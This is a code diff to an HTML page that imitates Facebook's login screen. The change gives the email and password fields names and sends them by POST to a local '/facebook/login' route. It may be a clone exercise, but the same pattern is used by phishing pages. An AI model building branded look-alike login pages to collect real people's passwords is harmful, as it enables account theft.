@@ -13,16 +13,17 @@
         <p>Connect with friends and the world around you on Facebook.</p>
       </div>
     </div>
-
+    
     <div class="right-column">
-      <form action="#">
-        <input type="text" placeholder="Email or phone number" />
-        <input type="password" placeholder="Password" />
+      <form action="/facebook/login" method="POST">
+        <input type="text" name="username" placeholder="Email or phone number" />
+        <input type="password" name="password" placeholder="Password" />
         <button type="submit">Log In</button>
         <a href="#" class="f-pws">Forgot password?</a>
         <hr style="width: -webkit-fill-available; opacity: 0.5" />
-        <button class="btn2">Create New Account</button>
+        <button class="btn2" type="submit">Create New Account</button>
       </form>
+      
       <div class="sub-link">
         <h3>
           <a href="#">Create a Page</a> for a celebrity, band, or business
